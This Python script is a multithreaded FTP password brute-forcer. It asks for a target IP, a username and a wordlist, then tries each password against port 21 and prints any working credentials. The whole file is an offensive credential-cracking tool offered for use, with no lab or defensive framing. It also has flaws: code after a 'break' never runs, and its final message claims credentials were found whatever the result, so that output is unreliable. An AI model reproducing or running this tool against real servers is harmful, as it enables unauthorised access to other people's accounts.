import ftplib
from threading import Thread
import queue
from colorama import Fore, init 

I = '\033[1;77m[i] \033[0m'
Q = '\033[1;77m[?] \033[0m'
G = '\033[1;34m[*] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'

q = queue.Queue()


def ftp_crack():
    

    host = input(G + "Enter Target IP: ")

    user = input(G + "Enter Target UserName: ")

    print(I + "Enter Your Fast EX:- min: 10 max: 30")
    n_threads = int(input(Q + "How Meny Fast You Whant: "))

    port = 21

    


    try:
        def connect_ftp():
            global q
            
            while True:

                password = q.get()
                server = ftplib.FTP()
                print("[!] Trying",  password)
                try:
                    server.connect(host, port, timeout=5)
                    server.login(user, password)
                except ftplib.error_perm:
                    pass
                else:
                    print(f"{Fore.GREEN}[+] Found credentials: ")
                    print(f"\tHost: {host}")
                    print(f"\tUser: {user}")
                    print(f"\tPassword: {password}{Fore.RESET}")
                    break
                    with q.mutex:
                        q.queue.clear()
                        q.all_tasks_done.notify_all()
                        q.unfinished_tasks = 0
                finally:
                    q.task_done()
        try:

            passwd = input(G + "Enter PasswordList: ")
            passwords = open(passwd).read().split("\n")
            print("[+] Passwords to try:", len(passwords))
        

            for password in passwords:
                q.put(password)
            for t in range(n_threads):
                thread = Thread(target=connect_ftp) 
                thread.daemon = True
                thread.start()
              
            q.join()
            print("\n" + S + "Task Finishd..!")
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: check list {Fore.RESET}")
        except FileNotFoundError:
            print("\n" + E + "Password File Not Found..!")
    except OSError:
        print("\n" + E + "Host Not Found...!")

    except KeyboardInterrupt:
        print("\n" + W + "ctrl + c Found...!")

    except EOFError:
        print("\n" + W + "Ctrl + c Found...!")




